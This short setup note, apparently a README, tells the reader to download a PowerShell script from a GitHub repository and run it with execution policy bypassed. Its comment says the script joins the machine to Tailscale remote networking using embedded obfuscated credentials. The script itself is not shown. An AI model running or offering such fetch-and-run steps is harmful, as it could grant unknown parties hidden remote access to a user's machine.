# TS Setup (PowerShell)

```powershell
Invoke-WebRequest `
  -Uri "https://raw.githubusercontent.com/waqarhossen/rmt/main/tailscale-setup.ps1" `
  -OutFile "tailscale-setup.ps1"

# Run the script (runs automatically with embedded obfuscated credentials):
powershell -ExecutionPolicy Bypass -File ".\tailscale-setup.ps1"
```
